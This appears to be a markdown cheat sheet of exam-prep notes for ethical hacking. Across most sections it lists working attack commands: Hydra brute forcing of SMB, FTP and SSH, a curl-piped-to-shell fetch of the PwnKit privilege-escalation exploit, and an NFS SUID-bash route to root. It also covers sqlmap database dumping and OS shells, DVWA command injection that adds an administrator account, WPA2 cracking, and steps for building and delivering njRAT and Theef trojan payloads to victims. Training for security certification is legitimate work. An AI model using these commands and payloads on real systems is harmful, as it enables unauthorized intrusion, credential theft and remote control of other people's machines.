# Enumeration

- Extensive Scan on Network and FQDN
- Finding IP Address of Services Running
- SMB Enumeration and Brutefocing
- FTP Enumeration and Bruteforcing
- SSH Enumeration and Bruteforcing
  
## Answer

### Use Case

**Displays OS, Computer-Name, Domain, Workgroups and Ports**

## Jump Links

- [Enumeration](#enumeration)
  - [Answer](#answer)
    - [Use Case](#use-case)
  - [Jump Links](#jump-links)
    - [Netdiscover](#netdiscover)
    - [Nmap](#nmap)
    - [SMB-Enumeration](#smb-enumeration)
    - [RPC Bind Enumeration](#rpc-bind-enumeration)
    - [SNMP-Enumeration](#snmp-enumeration)
    - [NetBios-Enumeration](#netbios-enumeration)
  - [FTP-Bruteforce](#ftp-bruteforce)
  - [SSH-Bruteforce](#ssh-bruteforce)
- [Android](#android)
  - [Answer](#answer-1)
    - [Using ADB Commands](#using-adb-commands)
    - [Using PhoneSploit](#using-phonesploit)
- [Entropy](#entropy)
  - [Answer](#answer-2)
- [Vulnerability Scan](#vulnerability-scan)
  - [Answer](#answer-3)
    - [OpenVAS](#openvas)
    - [Nessus](#nessus)
    - [Nikto](#nikto)
    - [WPScan](#wpscan)
- [Final Preparation](#final-preparation)
  - [Answer](#answer-4)
- [Steganography](#steganography)
  - [Answer](#answer-5)
    - [SNOW](#snow)
    - [Open Stego](#open-stego)
    - [Steghide](#steghide)
- [Previlege Escalation](#previlege-escalation)
  - [Answer](#answer-6)
  - [Linux](#linux)
    - [PwnKit Exploit CVE-2021-4034 - Pkexec Local Privilege Escalation](#pwnkit-exploit-cve-2021-4034---pkexec-local-privilege-escalation)
    - [Misconfigured NFS Share](#misconfigured-nfs-share)
      - [Steps for exploitation](#steps-for-exploitation)
- [Malware Analysis](#malware-analysis)
  - [Answer](#answer-7)
  - [String Search](#string-search)
    - [BinText](#bintext)
    - [PEid](#peid)
    - [Detect It Easy (DIE)](#detect-it-easy-die)
    - [PE Explorer](#pe-explorer)
    - [Dependency Walker](#dependency-walker)
- [Wireshark](#wireshark)
  - [Answer](#answer-8)
    - [To find DOS (SYN and ACK)](#to-find-dos-syn-and-ack)
    - [To find passwords](#to-find-passwords)
- [SQL Injection](#sql-injection)
  - [Answer](#answer-9)
    - [SQLmap](#sqlmap)
    - [MySQL Access with username and password](#mysql-access-with-username-and-password)
- [DVWA](#dvwa)
  - [Answer](#answer-10)
    - [To get the content inside specific file](#to-get-the-content-inside-specific-file)
    - [To create new user](#to-create-new-user)
- [IOT Traffic Analysis](#iot-traffic-analysis)
  - [Answer](#answer-11)
    - [MQTT Fundamentals](#mqtt-fundamentals)
      - [MQTT Broker](#mqtt-broker)
      - [MQTT Client](#mqtt-client)
      - [Topic](#topic)
      - [Payload](#payload)
      - [Message](#message)
      - [QoS (Quality of Service)](#qos-quality-of-service)
      - [Publish](#publish)
      - [Subscribe](#subscribe)
      - [Retain](#retain)
      - [Keep-alive-time](#keep-alive-time)
      - [Last Will and Testament (LWT)](#last-will-and-testament-lwt)
    - [Wireshark Filter to analyze IOT Traffic](#wireshark-filter-to-analyze-iot-traffic)
- [Wireless Attacks](#wireless-attacks)
  - [Answer](#answer-12)
    - [Aircrack-ng](#aircrack-ng)
- [RAT and Viruses](#rat-and-viruses)
  - [Answer](#answer-13)
    - [njRAT](#njrat)
    - [Theef Trojan](#theef-trojan)

### Netdiscover

- Get the list of live IP addresses

```bash
netdiacover -r 192.168.0.1/24
```

### Nmap

- Get the list of live IP in the range

```bash
nmap -sn 192.168.0.0/24 -oN nmap.txt
```

- Grep only IP addresses and Save into new file from output

```bash
grep -E -o '([0-9]{1,3}\.){3}[0-9]{1,3}' nmap.txt > live_ip.txt
```

- Operating System scan in Nmap

```bash
nmap -O <target_ip>
```

- Service Scan on Live IP Address

```bash
nmap -sC -sV -sS -O 192.168.0.xxx -oN nmap.txt -oN nmap_xxx.txt
```

- Automate Service Scan with loop

```bash
cat live_ip.txt | while read ip_address; do nmap -sC -sV -sS -O "$ip_address" -oN "nmap_$ip_address.txt" -Pn ; done
```

- SMB Script Scan

```bash
nmap --script smb-os-discovery.nse 192.168.0.xxx -d
```

- All Commands

```bash
nmap -sn 10.10.10.10/24 -oN nmap.txt
nmap -sC -sV -sS -O 10.10.10.11 -oN nmap.txt
nmap -A 10.10.10.10/24 -oN nmap.txt
```

- Basic Commands

```bash
nmap -f IP
nmap -sn -PR IP
nmap -sn -PE ip-range
nmap -sn 10.10.10.10/24
nmap -sC -sS -sV -O IP
nmap -A IP
```

- Flag Details

```bash
-sn disable port scan
-PR ARP ping scan
-PU UDP ping scan
-PE ICMP ECHO ping scan
-f  Splits IP into fragment packets
```

### SMB-Enumeration

- SMB shares and user enumeration

```shell
nmap -p xxxx --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.xxx.xxx
```

- SMB shares connection

```shell
smbclient //192.168.xxx.xxx/<share_name>
```

- SMB shares connection with user

```bash
smbclient //192.168.xxx.xxx/<share_name> -u <user>
```

- SMB Brute force using Hydra

```bash
hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.xxx.xxx smb
```

- [x] L = Login File 
- [x] P = Password File
- [ ] s = Port
- [ ] l = login user

- Recursively download the SMB share

```shell
smbget -R smb://192.168.xxx.xxx/<share_name>
```

### RPC Bind Enumeration

- Usually port 111 is used for the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. In our case, port 111 is access to a network file system. 

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 192.168.xxx.xxx
```


### SNMP-Enumeration

SNMP Enumeration

```bash
nmap -sU -P 161 IP
```

```bash
snmp-check IP
```

- Displays Network Info, Network Interfaces, Network IP, Routing Info, TCP connection and listening, process, Storage info, File System and Device Info.


### NetBios-Enumeration

```bash
nbstat -a IP
```

- -a NetBios name table
- -c list contents of NetBios name cache

```bash
net use
```

- Displays connection status, Shared folder/drive and Network Information.

## FTP-Bruteforce 

hydra -L /path/to/username.txt -P /path/to/password.txt ftp://192.168.0.109 -V

## SSH-Bruteforce

hydra -L /path/to/username.txt -P /path/to/password.txt ssh://192.168.0.109 -V

# Android

- Connecting to Mobile Device
- Getting shell on Mobile Device

## Answer

### Using ADB Commands

https://n00bie.medium.com/hacking-android-using-phonesploit-ffbb2a899e6

- Install ADB on the machine 

```bash
apt-get install adb
```

- Using ADB to check connected Android Devices

```bash
adb devices -l
```

- Using ADB to connect Android Device

```bash
adb connect 192.168.0.x:<port>
```

- Get into shell mode to connected Android Device

```bash
adb shell
```

- Download Files Using ADB

```bash
adb pull /path/to/file/in/android .
```

### Using PhoneSploit

- Running PhoneSploit

```bash
pyhton3 phonesploit.py
```

- Connect new device in PhoneSploit

```c
3 (Connect to new phone)
```

- Add IP address of android device

```c
4 (Access shell on phone)
```

# Entropy

- Calculate Entropy of File
- Calculate SHA384 hash of file

## Answer

- Calculate entropy of .elf files

```bash
ent -c your_file.elf
```

- Calculate sha 384 hash of the .elf file 

```bash
sha384sum your_file
```

- One liner to automate the findings

```bash
ls | while read names; do ent -c $names | grep Entropy | while read entropy; do print $names have $entropy ; done; done
```

# Vulnerability Scan

- Vulnerability Scan
- Calculate severity score

## Answer

1. [OpenVAS](#OpenVAS)
2. [Nessus](#Nessus)
3. [Nikto](#Nikto)

### OpenVAS

- Path of OpenVAS in Parrot OS
- Application > Pentesting > Vulnerability Analysis > OpenVAS - Greenbone > Start Greenbone Vulnerability Manager Service
- OpenVAS will run on **127.0.0.1:9392**
- Username - **admin**, Password - **password**
- Go to scans > Tasks
- Click magic wand icon > Task Wizard
- Input target IP and click Start Scan

### Nessus

- Nessus will run on **127.0.0.1:8834**
- Username - **admin**, Password - **password**
- Click Policy > Create new Policy > Advance Scan
- Fill require details and start scan

### Nikto

- Path of Nikto in Parrot OS
- Application > Pentesting > Web Application Analysis > Web Vulnerability Scanners > Nikto 
- Command Line Tool 

```bash
nikto -h 
```

- Nikto Tuning Scan

```bash
nikto <target> -Tuning x
```

### WPScan

- To enumerate WordPress users

```bash
wpscan --url https://example.com/ --enumerate u (To enumerate the user)
```

- To brute force enumerated user password

```bash
wpscan --url http://<IP>:<Port>/CEH/ -u <user_name> -P /path/pass.txt
```

# Final Preparation

- Linux Remote logins like xfreerdp bruteforce
- Netbios enumeration
- SNMP Enumeration

## Answer 

- [Extra.md](Extra.md)

# Steganography

- Image File Analysis
- Extraction of Data from Image File
- Bruteforcing Password for Image File (StageSeek)

## Answer

1. [SNOW](#SNOW) - (Windows)
2. [Open Stego](#Open%20Stego) - (Windows / Linux GUI)
3. [Steghide](#Steghide) - (Linux)

### SNOW

```bash
./snow.exe -C -p <password> extract.txt
```

-C  compressing / uncompressing
-p  password


### Open Stego 

- GUI Tool
- Go to extract data > select file > select password > select extract path

### Steghide

- Command for extracting 

```bash
steghide extract -sf stg.jpg
```

# Previlege Escalation

- Vertical Previlege Escalation using basic suid permissions
- Vertical Previlege Escalation using Linpeas
- Vertical Previlege Escalation using CVE and PKExec Exploit
- Vertical Previlege Escalation using Misconfigured NFS Shares

## Answer

## Linux

- Commands that can be run by user as root

```bash
sudo -l 
```

- Run Linpeas to get more insights for privilege escalation

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

### PwnKit Exploit CVE-2021-4034 - Pkexec Local Privilege Escalation

- GitHub URL: https://github.com/ly4k/PwnKit
- Command for Privilege Escalation

```bash 
sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
```

### Misconfigured NFS Share

- NFS Shares default port is **2049**
- List misconfigured NFS Shares

```bash
apt install nfs-common
```

```bash
showmount -e 192.168.xxx.xxx 
```

- Using Nmap to list misconfigured NFS Shares

```bash
nmap -sV --script=nfs-showmount 192.168.xxx.xxx
```

#### Steps for exploitation

1. Create temporary folder to mount misconfigured NFS Share

```bash
mkdir /tmp/nfs
```

2. Mount the misconfigured NFS Share to newly created folder

```bash
mount -t nfs 192.168.xxx.xxx:/<share_name> /tmp/nfs
```

3. After mounting move to the mounted share

```bash
cd /tmp/nfs
```

4. Copy the bash shell into mounted directory

```bash
cp /bin/bash .
```

5. Give SUID permissions to **bash**

```bash
chmod +s bash
```

6. Login to target machine using SSH
7. Move to the mounter share path
8. Run the copied **bash** file with **-p** flag to get root access

```bash
./bash -p 
```

- SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

```bash
find / -perm -u=s -type f 2>/dev/null
```

# Malware Analysis

- Malware Analysis
- Detect Entry Point
- Detect Hex values and Hashes

## Answer

## String Search

### BinText 

- extract embedded strings from executable files
- Similar Tools:
	1. FileSeek
	2. Free EXE DLL Resource Extract
	3. FLOSS
	4. Strings
- Available for Windows OS

### PEid

- Used to identify packaging and obfuscation for windows executable files
- Detects entrypoints, common packers, cryptors, and compilers for PE executable file
- Available OS Windows

### Detect It Easy (DIE)

- Used to identify packaging and obfuscation for linux executable files like ELF
- Similar Tools:
	1. Macro_Pack
	2. UPX
	3. ASPack
- Detects entrypoints, base address, compiler, language details, entropy, strings, etc.
- Available OS windows

### PE Explorer

- Used to analyze windows binary PE Executable files.
- Detects time of creation, modification, import and export functions, compilation file, DLLs, linked files and strings, menus and symbols.
- Available OS windows
- Similar Tools:
	1. Portable Executable Scanner (pescan)
	2. Resource Hacker
	3. PEView
- Detects entrypoints, header information, file information, etc.

### Dependency Walker

- Used to identify file dependency module for an executable file.
- Similar Tools:
	1. Dependency-check
	2. Snyk
	3. RetireJS

# Wireshark

- Wireshark Analysis
- DDOS Attack Analysis
- Password Capture

## Answer

### To find DOS (SYN and ACK)

```java
tcp.flags.syn == 1  , tcp.flags.syn == 1 and tcp.flags.ack == 0
```

### To find passwords 

```java
http.request.method == POST
```

- To check number of packets from each connection go to statistics tabs

# SQL Injection

- SQL Injection Attack
- Querying Database
- Dumping tables and columns

## Answer

Tools used for SQL Injection:
1. SQLmap
2. Mole
3. Blisqy
4. Blind-sql-bitshifting
5. NoSQLMap

### SQLmap

- Login to the website with provided credentials
- Go to view profile section and copy the URL
- Open Inspect element > console and type

```java
document.cookie
```
- Copy the cookie value and use copied values in following command

- Command for enumerating databases
```bash
sqlmap -u <copied_profile_url> --cookie='<copied_cookie_value' --dbs
```

- Command for enumerating tables

```bash
sqlmap -u <copied_profile_url> --cookie='<copied_cookie_value' -D <database_name> --tables
```

- Command for dumping whole table data

```bash
sqlmap -u <copied_profile_url> --cookie='<copied_cookie_value' -D <database_name> -T <table_name> --dump
```

- Command for getting OS level shell on machine using SQLmap

```bash
sqlmap -u <copied_profile_url> --cookie='<copied_cookie_value' --os-shell
```


### MySQL Access with username and password

- Login to MySQL database

```bash
mysql -U qdpmadmin -h 192.168.xxx.xxx -P <password> 
```

- Command to list all the databases

```bash
show databases;
```

- Command to select one database

```bash
use <database_name>;
```

- Command to list all the tables inside the database

```bash
show tables;
```

- Command to list all the columns in a table

```bash
select * from <table_name>;
```

# DVWA

- Command Injection
- List File
- Get content of File

## Answer

- Login to DVWA with username as <mark style="background: #FFB8EBA6;">admin</mark> and password as <mark style="background: #FFB8EBA6;">password</mark> 
- Set the Security Level "Low"
- Click on the Command Injection Tab  
- Now enter the system commands in Parameter

### To get the content inside specific file

- Command to get the hostname of machine

```shell
hostname
```

- Command to get the current user details

```shell
whoami    
```

- Command to list content in specific directory

```bash
dir C:\wamp64\WWW\DVWA\hackable\uploads\ 
```

- List the contents inside specific file

```shell
type C:\wamp64\WWW\DVWA\hackable\uploads\file.txt
```

### To create new user

- Command to get details about user

```shell
net user
```

- Command to add new user

```bash
net user Test /Add
```

- Command to check new user added into the system

```shell
net user
```

- Command to access the newly added user

```shell
net user Test
```

- Command to add the user into Administrators group

```shell
net localgroup Administrators Test /Add
```

# IOT Traffic Analysis

- IOT Network Analyis
- IOT Traffic Details
- Publich Message Filter

## Answer

### MQTT Fundamentals

#### MQTT Broker
- Receives published topics
- Distributes topics to subscribers
- Keeps client connection alive
- Sends Last Will and Testament (LWT) to subscribers if a client "ungracefully disconnects"

#### MQTT Client
- Can publish topic(s), keep-alive time, Retain bit, QoS, Last Will and Testaments
- Can subscribe to topic(s)

#### Topic
- Name of data

#### Payload
- Actual data

#### Message 
- Topic + Payload

#### QoS (Quality of Service)
- 0 = At most once - transmit message once (relies on TCP)
- 1 = At least once - transmit message until it is acknowledged by receiver (may receive more than one)
- 2 = Exactly once - transmit message needs "received" message, asks if it can be "released", needs "complete" message.

#### Publish
- To send Topic with Payload to MQTT Broker

#### Subscribe
- To request a Topic with Payload update from MQTT Broker

#### Retain
- Ask MQTT Broker to save the Topic with Payload even after sending it to all the subscribing clients

#### Keep-alive-time
- How often Broker "pings" client to see if he's there

#### Last Will and Testament (LWT)
- Topic with Payload initially sent by an MQTT Client to the MQTT Broker for the Broker to send to other Clients if he is "ungracefully disconnected"

### Wireshark Filter to analyze IOT Traffic

```wireshark-filter
mqtt
```

- After filtering MQTT traffic select Publish Message
- Expand the MQ Telemetry Transport Protocol
- Expand Header Flags
- It contains information like message length, message type and actual message

# Wireless Attacks

- Wireless Attacks
- Crack the Wireless Handshake Captures

## Answer

### Aircrack-ng

- Command to crack the WEP captured file

```bash
aircrack-ng <WEP_capture_file>.cap 
```

- Command to crack WPA2 captured handshake file

```bash
aircrack-ng <WPA2_handshake_file>.cap -w /path/to/password_list.txt
```

# RAT and Viruses

- RAT, Viruses and Trojan Access
- Default ports of Different RATs
- Detailed Guide to access through RATs

## Answer

### njRAT

- Default port for njRAT is **5552**
- Open njRAT .exe file to open the gui menu
- Start the njRAT server by providing port
- Click on builder to build payload
- Provide the attacker machines IP address and listening port
- Select registry startup and build the payload
- Deliver the payload into the target victim machine
- Execute the payload in target machine
- njRAT will receive reverse connection from target machine in gui
- Right Click on machine name > Select Manager to view all files in system

- Command to find specific file name in Windows system using powershell

```powershell
Get-ChildItem -Path C:\ -Recurse -Filter "<file_name>.txt" -ErrorAction SilentlyContinue
```

### Theef Trojan

- Default port for Delphi is 9871 and 6703
- Send the server.exe file to victim and execute in their system
- Open Theef client .exe file to open the gui menu
- Fill the IP address and port of victim machine where payload is running and click connect. 